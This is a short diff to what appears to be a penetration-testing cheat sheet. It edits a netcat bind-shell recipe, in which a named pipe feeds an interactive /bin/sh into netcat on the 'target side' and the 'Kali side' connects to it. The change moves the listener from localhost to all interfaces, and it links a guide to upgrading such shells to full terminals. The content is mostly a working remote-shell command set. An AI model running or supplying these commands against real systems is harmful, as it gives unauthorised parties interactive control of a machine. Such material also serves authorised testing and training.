@@ -142,13 +142,13 @@ On TARGET side:
 
 ```
 rm -f /tmp/f; mkfifo /tmp/f
-cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc -nvlp 1234 > /tmp/f
 ```
 
  On Kali side:
 
 ```
-nc host.example.com 1234
+nc <TARGET-IP|HOSTNAME> 1234
 ```
 
 Upgrade Netcat shell to an interactive: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
